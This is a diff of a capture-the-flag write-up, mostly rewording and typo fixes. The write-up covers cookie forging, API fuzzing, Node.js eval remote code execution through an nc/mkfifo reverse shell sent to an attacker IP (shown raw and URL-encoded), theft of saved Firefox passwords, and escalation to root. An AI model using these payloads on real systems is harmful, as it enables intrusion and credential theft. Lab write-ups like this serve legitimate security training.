@@ -33,17 +33,16 @@ Required OpenVPN to connect to corresponding server
         }
     </script>
 ```
-
-We can run the getAccess() function through the browser by console tab or browsing to \<machine ip>/api/access
+I run the getAccess() function through the browser by console tab, but you can also access that by browsing to \<machine ip>/api/access
 
 ![](./img/Console.jpg)
 
-By decoding, we will get the original token and we should set that in our cookie
+By decoding, I will get the original token and should set that in cookie
 
 ![Session cookie](./img/session.jpg)
 
 ## [Q3] What is the content of user.txt?
-Now let's refresh the page.
+Now refresh the page.
 Feel free to surf the site after that XD
 
 ***
@@ -52,7 +51,7 @@ Warning! The site contains blinking images and sensitive words.
 
 ***
 
-After looking at source and linked [JS](./src/script.js) file, I figured out that there are serveral links in the page that interact with \<machine ip>/api/items/ 
+After looking at the source and linked [JS](./src/script.js) file, I figured out that there are several links in the page that interact with \<machine ip>/api/items/ 
 
 \<machine ip>/api/items :
 ![/api/items](./img/items.jpg)
@@ -65,7 +64,7 @@ Let's check the methods by sending an **OPTION** http request
     
     Allow: GET,HEAD,POST
 
-So we can fuzz the site to find valid arguments
+So I should fuzz the site to find valid arguments
 
     └─$wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/api/objects.txt -X POST --hc 404,400 <machine ip>/api/items\?FUZZ\=test
 
@@ -102,18 +101,18 @@ Let's check cmd
 </html>
 
 
-So it's a **Node.JS**. Maybe we can get rce by nodejs eval ...
+So it's a **Node.JS**. Maybe I can get rce by Node.js eval ...
 
 
 Reverse shell payload:
 
     require("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Attacker IP> <Attacker Port> >/tmp/f ')
 
-First, We must encode the payload as URL and then we're good to go:
+First, I must encode the payload as a URL, and then It's good to go
 
     └─$ curl -X POST <Machine IP>/api/items\?cmd\=%72%65%71%75%69%72%65%28%22%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%22%29%2e%65%78%65%63%28%27%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%3c%41%74%74%61%63%6b%65%72%20%49%50%3e%20%3c%41%74%74%61%63%6b%65%72%20%50%6f%72%74%3e%20%3e%2f%74%6d%70%2f%66%20%27%29
 
-We have shell :D
+I have a reverse shell :D
 
     └─$ nc -nvlp 4444             
     listening on [any] 4444 ...
@@ -160,7 +159,7 @@ linPEAS interesting results:
     user:x:1000:1000:user:/home/user:/bin/bash
     v0id:x:1001:1001:,,,:/home/v0id:/bin/bash
 
-For now let's check firefox hidden directory by sending that to our attack machine
+For now, I'm going to check firefox hidden directory by sending that to my machine
 
     user@ubuntu:~$ tar -cvf firefox.tgz .firefox 
 
@@ -175,16 +174,16 @@ For now let's check firefox hidden directory by sending that to our attack machi
     firefox.tgz                                   100%   15MB 385.3KB/s   00:39 
 
 
-Now in your attacker machine:
+Now in my machine:
 
     └─$ tar -xvf firefox.tgz 
     └─$ firefox --profile .firefox/b5w4643p.default-release --allow-downgrade
 
-This will open firefox browser and you can head to saved passwords
+This will open the firefox browser and I can head to saved passwords
 
 ![void pass](./img/firefox.jpg)
 
-Now with linPEAS output and saved password in firefox for v0id we can see /root/root.txt
+Now with linPEAS' output and saved password in the firefox for user v0id I can retrieve /root/root.txt
 
     user@ubuntu:~$ su - v0id -c "doas -u root bash -c 'cat /root/root.txt'"
     su - v0id -c "doas -u root bash -c 'cat /root/root.txt'"
